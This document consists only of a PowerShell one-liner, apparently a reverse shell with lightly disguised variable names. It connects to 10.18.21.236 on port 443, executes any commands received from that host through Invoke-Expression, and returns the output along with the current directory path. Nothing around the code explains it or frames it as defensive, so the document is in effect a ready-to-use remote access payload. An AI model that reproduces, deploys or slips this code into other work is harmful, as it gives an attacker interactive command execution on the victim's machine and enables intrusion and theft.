
```powershell
$cthulhu = New-Object System.Net.Sockets.TCPClient('10.18.21.236',443);$tntcl = $cthulhu.GetStream();[byte[]]$cult = 0..65535|%{0};while(($i = $tntcl.Read($cult, 0, $cult.Length)) -ne 0){;$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($cult,0, $i);$ex = (iex $d 2>&1 | Out-String );$ex2  = $ex + 'CF ' + (pwd).Path + '> ';$shog = ([text.encoding]::ASCII).GetBytes($ex2);$tntcl.Write($shog,0,$shog.Length);$tntcl.Flush()};
```